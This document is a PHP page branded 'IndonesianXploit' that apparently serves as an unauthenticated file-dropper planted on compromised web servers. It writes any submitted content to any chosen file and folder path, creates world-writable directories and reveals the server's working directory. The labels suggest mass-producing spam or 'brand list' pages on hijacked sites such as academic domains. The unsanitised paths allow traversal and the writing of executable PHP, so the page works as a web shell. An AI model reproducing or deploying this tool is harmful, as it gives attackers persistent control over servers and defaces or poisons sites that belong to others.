<?php
session_start();
$success = false;
$error = "";

if ($_SERVER['REQUEST_METHOD'] === "POST") {
    $html_content = $_POST['content'] ?? '';
    $base_url = $_POST['base_url'] ?? '';
    $file_name = $_POST['file_name'] ?? '';
    $folder_name = $_POST['folder_name'] ?? '';

    // Validasi input
    if (empty($html_content) || empty($base_url) || empty($file_name)) {
        $error = "Semua field wajib diisi kecuali Nama Folder (Opsional).";
    } else {
        $save_dir = $folder_name ? $folder_name . '/' : '';
        if (!empty($save_dir) && !is_dir($save_dir)) {
            if (!mkdir($save_dir, 0777, true)) {
                $error = "Gagal membuat folder.";
            }
        }
        if (empty($error)) {
            $file_path = $save_dir . $file_name;
            if (file_put_contents($file_path, $html_content) !== false) {
                $success = true;
            } else {
                $error = "Gagal membuat file.";
            }
        }
    }
}

// Dapatkan lokasi direktori saat ini
$current_dir = getcwd();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Automatic Create Dir & Files</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
    <style>
        body {
            background: url('https://res.cloudinary.com/dvztple2b/image/upload/v1748786177/photo_2025-05-24_16-00-26_x4w454.jpg') no-repeat center center fixed;
            background-size: cover;
        }
        .main-box {
            background: #0b0e29;
            color: white;
            border-radius: 10px;
            margin-top: 40px;
            padding: 30px;
            box-shadow: 0 0 20px #0008;
        }
        .form-control, .btn {
            border-radius: 5px !important;
        }
        footer {
            color: #fff;
            text-align: center;
            margin-top: 40px;
            text-shadow: 1px 1px 3px #000;
        }
        label {
            color: #fff;
        }
        .info-dir {
            color: #ffeb3b;
            font-size: 0.98em;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="row justify-content-center">
        <div class="col-lg-8">
            <div class="main-box">
                <h2 class="mb-2">Automatic Create Dir & Files</h2>
                <p>MASUKAN DIBAWAH ISI SCRIPT HTML</p>
                <div class="info-dir">
                    <b>Current Directory:</b> <?php echo htmlspecialchars($current_dir); ?>
                </div>
                <form method="post">
                    <div class="form-group">
                        <textarea name="content" class="form-control" rows="6" placeholder="Masukkan script HTML di sini..."><?php echo isset($_POST['content']) ? htmlspecialchars($_POST['content']) : ''; ?></textarea>
                    </div>
                    <div class="form-group">
                        <label>Base URL Directory :</label>
                        <input type="text" name="base_url" class="form-control" placeholder="https://google.ac.id" value="<?php echo isset($_POST['base_url']) ? htmlspecialchars($_POST['base_url']) : ''; ?>">
                    </div>
                    <div class="form-group">
                        <label>Nama File List Brand :</label>
                        <input type="text" name="file_name" class="form-control" placeholder="list.txt" value="<?php echo isset($_POST['file_name']) ? htmlspecialchars($_POST['file_name']) : ''; ?>">
                    </div>
                    <div class="form-group">
                        <label>Nama Folder (Opsional):</label>
                        <input type="text" name="folder_name" class="form-control" placeholder="Contoh: myfolder" value="<?php echo isset($_POST['folder_name']) ? htmlspecialchars($_POST['folder_name']) : ''; ?>">
                    </div>
                    <button type="submit" class="btn btn-warning btn-block">Generate!</button>
                </form>
            </div>
        </div>
    </div>
    <footer>
        © 2025 All rights reserved - IndonesianXploit.<br>- yourdre4m7 -
    </footer>
</div>
<?php if ($error): ?>
<script>
Swal.fire({icon:"error",title:"Error",text:"<?php echo htmlspecialchars($error); ?>"});
</script>
<?php elseif ($success): ?>
<script>
Swal.fire({icon:"success",title:"Success",text:"File berhasil dibuat!"});
</script>
<?php endif; ?>
</body>
</html>
